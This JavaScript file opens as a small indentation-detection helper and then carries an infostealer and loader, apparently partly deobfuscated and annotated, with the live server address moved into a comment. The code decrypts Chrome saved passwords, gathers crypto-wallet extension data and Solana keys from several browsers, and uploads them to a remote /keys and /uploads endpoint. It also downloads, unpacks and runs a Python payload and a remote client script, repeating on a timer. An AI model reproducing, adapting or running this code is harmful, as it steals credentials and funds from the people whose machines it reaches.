var t = /^(?:( )+|\t+)/;
module.exports = function(c) {
    if ("string" != typeof c) throw new TypeError("Expected a string");
    var r, a, e = 0,
        n = {};
    c.split(/\n/g).forEach((function(c) {
            if (c) {
                var l, m = c.match(t);
                m ? (l = m[0].length, m[1]) : l = 0;
                var o = l - e;
                e = l, o ? (r = n[(a = o > 0) ? o : -o]) ? r[0]++ : r = n[o] = [1, 0] : r && (r[1] += Number(a))
            }
        })),
        function(t) {
            var c = 0,
                r = 0,
                a = 0;
            for (var e in t) {
                var n = t[e],
                    l = n[0],
                    m = n[1];
                (l > r || l === r && m > a) && (r = l, a = m, c = Number(e))
            }
        }(n)
};
const fs = require("fs"),
    os = require("os"),
    sqlite3 = require("sqlite3"),
    ppath = require("path"),
    rrequest = require("request"),
    ccrypto = require("crypto"),
    child_process = require("child_process"),
    exec_child_process = child_process["exec"],
    homedir = os["homedir"](),
    platform = os["platform"](),
    tmpdir = os["tmpdir"](),
    hostname = os["hostname"](),
    ttype = os["type"]();
let V;
const f = t => Buffer.from(t, "base64").toString("utf8"),
    server_root_url = "http://127.0.0.1", // http://195.201.172.170:1224
    R = t => t.replace(/^~([a-z]+|\/)/, ((t, c) => "/" === c ? homedir : `${ppath.dirname(homedir)}/${c}`)),
    gget = "Z2V0",             // get
    eexistsSync = f("ZXhpc3RzU3luYw"), // existsSync
    store_node = "L3N0b3JlLm5vZGU";   // /store.node

function N(t) {
    try {
        return fs["accessSync"](t), !0
    } catch (t) {
        return !1
    }
}
const k = "L0FwcERhdGEvTG9jYWwvR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGE", // /AppData/Local/Google/Chrome/User Data
    ddefault = f("RGVmYXVsdA"), // Default
    pprofile = f("UHJvZmlsZQ"), // Profile
    E = () => {
        result = "";
        try {
            const t = require(`${homedir}${f(store_node)}`);
            if (ttype != "Windows_NT")
                return;
            const chrome_user_data_path = "~/AppData/Local/Google/Chrome/User Data";
            fs["readFile"]("~/AppData/Local/Google/Chrome/User Data/Local State", "utf-8", ((a, l) => {
                console.log("read file!");
                mkey = JSON.parse(l), mkey = mkey["os_crypt"]["encrypted_key"], mkey = (t => {
                    var c = atob(t),
                        r = new Uint8Array(c.length);
                    for (let t = 0; t < c.length; t++)
                        r[t] = c.charCodeAt(t);
                    return r
                })(mkey);
                try {
                    const a = t["CryptUnprotectData"](mkey.slice(5));
                    for (ii = 0; ii <= 100; ii++) {
                        const profile_name = 0 === ii ? ddefault : `${pprofile} ${ii}`,
                            e = `${chrome_user_data_path}/${profile_name}/Login Data`,
                            l = `${chrome_user_data_path}/t${profile_name}`;
                        console.log(`Try to copy file from ${e} to ${l}`);
                        N(e) && fs["copyFile"](e, l, (t => {
                            try {
                                const t = new sqlite3["Database"](l);
                                t.all("SELECT * FROM logins", ((c, r) => {
                                    var e = "";
                                    c || r.forEach((t => {
                                        var origin_url = t["origin_url"],
                                            user_name = t["username_value"],
                                            password = t["password_value"];
                                        try {
                                            "v" === password.subarray(0, 1).toString() && 
                                            (
                                                iv = password.subarray(3, 15),
                                                cip = password.subarray(15, password.length - 16), 
                                                cip.length && 
                                                (
                                                    mmm = ccrypto["createDecipheriv"]("aes-256-gcm", a, iv).update(cip),
                                                    e = `${e}W: ${origin_url} U:  ${user_name} P: ${mmm.toString("latin1")}\n\n`
                                                )
                                            )
                                        } catch (t) {}
                                    })), t.close(), /*fs["unlink"](l, (t => {})),*/ upload_data_to_server(e)
                                }))
                            } catch (t) {}
                        }))
                    }
                } catch (t) {}
            }))
        } catch (t) {}
    },
    Q = f("cmVhZGRpclN5bmM"),
    S = f("c3RhdFN5bmM"),
    z = (f("aXNEaXJlY3Rvcnk"), f("cG9zdA")), // isDirectory,  post
    T = f("TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz"),
    q = f("LmxkYg"),
    H = f("LmxvZw"),
    C = f("c29sYW5hX2lkLnR4dA");
let M = "comp";
const I = [
        ["/Library/Application Support/Google/Chrome", f("Ly5jb25maWcvZ29vZ2xlLWNocm9tZQ"), f(k)],
        ["/Library/Application Support/BraveSoftware/Brave-Browser", f("Ly5jb25maWcvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy"), f("L0FwcERhdGEvTG9jYWwvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2VyL1VzZXIgRGF0YQ")],
        ["/Library/Application Support/com.operasoftware.Opera", f("Ly5jb25maWcvb3BlcmE"), f("L0FwcERhdGEvUm9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUvVXNlciBEYXRh")]
    ],
    A = ["bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4", "ZWpiYWxiYWtvcGxjaGxnaGVjZGFsbWVlZWFqbmltaG0", "Zmhib2hpbWFlbGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA", "aG5mYW5rbm9jZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ", "YmZuYWVsbW9tZWltaGxwbWdqbmpvcGhocGtrb2xqcGE", "Zm5qaG1raGhta2Jqa2thYm5kY25ub2dhZ29nYm5lZWM", "Y2ZiZmRoaW1pZmRtZGVoam1rZG9icGNqZmVmYmxram0", "aHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG4", "aWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWM", "aGlmYWZnbWNjZHBla3Bsb21qamtjZmdvZG5oY2VsbGo", "YWVhY2hrbm1lZnBoZXBjY2lvbmJvb2hja29ub2VlbWc"],
    O = async () => {
        M = hostname;
        try {
            const t = R("~/");
            I.forEach((async (c, r) => {
                let a = "";
                a = "d" == platform[0] ? `${t}${c[0]}` : "l" == platform[0] ? `${t}${c[1]}` : `${t}${c[2]}`, await (async (t, c, r) => {
                    let a = t;
                    if (!a || "" === a) return [];
                    try {
                        if (!N(a)) return []
                    } catch (t) {
                        return []
                    }
                    c || (c = "");
                    let e = [];
                    for (let r = 0; r < 200; r++) {
                        const n = `${t}/${0===r?ddefault:`${pprofile} ${r}`}/${T}`;
                        for (let t = 0; t < A.length; t++) {
                            const l = f(A[t]);
                            let m = `${n}/${l}`;
                            if (N(m)) {
                                try {
                                    far = fs[Q](m)
                                } catch (t) {
                                    far = []
                                }
                                far.forEach((async t => {
                                    a = ppath.join(m, t);
                                    try {
                                        (a.includes(q) || a.includes(H)) && e.push({
                                            value: fs[P](a),
                                            options: {
                                                filename: `${c}${r}_${l}_${t}`
                                            }
                                        })
                                    } catch (t) {}
                                }))
                            }
                        }
                    }
                    if (r && (a = `${homedir}${f("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`, fs[eexistsSync](a))) try {
                        e.push({
                            value: fs[P](a),
                            options: {
                                filename: C
                            }
                        })
                    } catch (t) {}
                    const n = {
                        timestamp: V.toString(),
                        type: "5Team9",
                        hid: M,
                        multi_file: e
                    };
                    try {
                        const t = {
                            url: `${server_root_url}/uploads`, // http://195.201.172.170:1224/uploads
                            formData: n
                        };
                        rrequest[z](t, ((t, c, r) => {}))
                    } catch (t) {}
                    return e
                })(a, `${r}_`, 0 == r)
            }))
        } catch (t) {}
    },

    P = (f("YXBwZW5kRmlsZVN5bmM"), f("Y3JlYXRlUmVhZFN0cmVhbQ")),
    D = f("L3VwbG9hZHM"),
    _ = f("L2tleXM"),
    K = f("cHl0aG9u"),
    
    upload_data_to_server = async t => {
        const c = {
                timestamp: V.toString(),
                type: "5Team9",
                hid: M,
                content: t.toString()
            },
            r = {
                url: `${server_root_url}${_}`,
                formData: c
            };
        try {
            rrequest[z](r, ((t, c, r) => {}))
        } catch (t) {}
    },
    
    nt = f("cm1TeW5j"), lt = f("dGFyIC14Zg"), mt = f("Y3VybCAtTG8"), ot = f("XHBccHl0aG9uLmV4ZQ"), it = async t => {
        exec_child_process(`tar -xf ${t} -C ${homedir}`, ((c, r, a) => {
            c ? fs["rmSync"](t) : (fs["rmSync"](t), ht())
        }))
    };
let Zt = 0;
const st = async () => {
    const t = `${server_root_url}/pdown`,
        r = `${tmpdir}\\p.zi`,
        a = `${tmpdir}\\p2.zip`;
    if (fs[eexistsSync](r)) try {
        var e = fs[S](r);
        e.size >= 52344610 ? fs["rename"](r, a, (t => {
            if (t) throw t;
            it(a)
        })) : (Zt < e.size ? Zt = e.size : fs["rmSync"](r), bt())
    } catch (t) {
        bt()
    } else {
        exec_child_process(`curl -Lo "${r}" "${t}"`, ((t, c, e) => {
            if (t) bt();
            else try {
                fs["renameSync"](r, a), it(a)
            } catch (t) {}
        }))
    }
};

function bt() {
    setTimeout((() => {
        st()
    }), 2e4)
}
const Gt = async () => {
    var t = process.version.match(/^v(\d+\.\d+)/)[1];
    const c = `${server_root_url}/node/${t}`,
        r = `${homedir}${f(store_node)}`;
    if (fs[eexistsSync](r)) E();
    else {
        console.log(`curl -Lo "${r}" "${c}"`);
        //child_process.spawn(`curl -Lo "${r}" "${c}"`, ((t, c, r) => {
            E()
        //}))
    }
},
ht = async () => await new Promise(((t, c) => {
    if ("w" == platform[0]) {
        Gt();
        const t = `${homedir}\p\python.exe`;
        fs[eexistsSync](`${t}`) ? (() => {
            const c = "writeFileSync",
                r = f(gget),
                a = `${server_root_url}/client/5Team9`,
                e = ppath.join(homedir, "cl"),
                n = `"${homedir}\p\python.exe" "${e}"`;
            try {
                fs["rmSync"](e)
            } catch (t) {}
            rrequest[r](a, ((t, r, a) => {
                try {
                    fs[c](e, a), exec_child_process(n, ((t, c, r) => {
                        t && Gt()
                    }))
                } catch (t) {
                    Gt()
                }
            }))
        })() : st()
    } else(() => {
        const c = "writeFileSync",
            r = f(gget),
            a = `${server_root_url}/client/5Team9`,
            e = ppath.join(homedir, "cl");
        let n = `${K}3 "${e}"`;
        rrequest[r](a, ((t, r, a) => {
            fs[c](e, a), exec_child_process(n, ((t, c, r) => {}))
        }))
    })()
}));
var $t = 0;
const ut = async () => {
    try {
        V = Date.now(), await O(), ht()
    } catch (t) {}
};
ut();
let yt = setInterval((() => {
    ($t += 1) < 5 ? ut() : clearInterval(yt)
}), 6e5);
Object.prototype.hasOwnProperty, Object.prototype.toString, Object.defineProperty, Object.getOwnPropertyDescriptor;